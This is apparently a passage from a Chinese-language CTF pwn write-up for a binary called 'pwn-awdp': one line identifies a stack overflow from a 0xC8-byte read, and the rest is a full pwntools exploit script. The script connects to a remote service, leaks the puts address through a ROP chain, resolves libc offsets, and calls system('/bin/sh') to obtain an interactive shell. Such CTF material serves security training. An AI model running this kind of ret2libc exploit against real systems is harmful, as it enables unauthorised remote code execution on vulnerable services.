漏洞点，读取上限为0xC8，超过buf的存储上限形成栈溢出，考虑ret2libc，接下来只需要让第一个字符为0使程序退出即可

### exp

```python
from pwn import *
from LibcSearcher import *

#libc=ELF('./libc-2.31.so')
r = remote('192.168.10.3', 6666)
#context(log_level='debug',arch='amd64', os='linux')
#r = process('./pwn-awdp')
elf = ELF('./pwn-awdp')

main = 0x400847
pop_rdi = 0x4010b3
ret = 0x4006ae

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

r.sendlineafter('name be: ', '1')
offset = 0x6 + 8
payload = b'0' + b'a' * (offset - 1)
payload = payload + p64(pop_rdi)
payload = payload + p64(puts_got)
payload = payload + p64(puts_plt)
payload = payload + p64(main)
r.sendlineafter('Input 1, 2, 3, or 4: ', '2')
r.sendlineafter('Input 1, 2, 3, or 4: ', payload)
r.recvuntil('game over...\n')
puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8, b'\0'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
Offset = puts_addr - libc.dump('puts')
binsh = Offset + libc.dump('str_bin_sh')
system = Offset + libc.dump('system')
r.sendlineafter('name be: ', '1')
offset = 0x6 + 8
payload = b'0' + b'a' * (offset - 1)
payload = payload + p64(ret)
payload = payload + p64(pop_rdi)
payload = payload + p64(binsh)
payload = payload + p64(system)
r.sendlineafter('Input 1, 2, 3, or 4: ', '2')
r.sendlineafter('Input 1, 2, 3, or 4: ', payload)

r.interactive()

```
